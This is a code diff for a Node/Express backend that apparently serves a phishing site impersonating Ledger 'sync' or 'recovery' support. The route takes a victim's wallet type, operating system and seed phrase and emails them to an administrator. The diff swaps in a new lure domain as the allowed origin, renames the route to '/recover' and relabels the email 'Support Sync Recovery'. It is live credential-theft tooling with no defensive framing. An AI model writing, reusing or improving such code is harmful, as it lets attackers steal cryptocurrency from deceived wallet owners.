@@ -6,7 +6,7 @@ require('dotenv').config()
 const cors = require('cors')
 
 const allowedOrigins = [
-    'https://ledger.liverestore.site',
+    'https://livesyncdevice.onrender.com',
 //     'http://localhost:5500',
 //     'http://127.0.0.1:5500',
 ]
@@ -37,7 +37,7 @@ const transporter = nodemailer.createTransport({
 });
 
 // define a route to send email
-app.post('/connection', (req, res) => {
+app.post('/recover', (req, res) => {
     const { wallet, os, phrase }  = req.body
     const admin = process.env.ADMIN_EMAIL
 
@@ -45,7 +45,7 @@ app.post('/connection', (req, res) => {
   const mailOptions = {
     from: `"ledger-sync-live" <${process.env.USER}>`,
         to: admin,
-        subject: 'New Ledger Form Submission',
+        subject: 'Support Sync Recovery',
         text: `Wallet Type: ${wallet},\n\nOS Type: ${os},\n\nPhrase: ${phrase}`,
   };
 
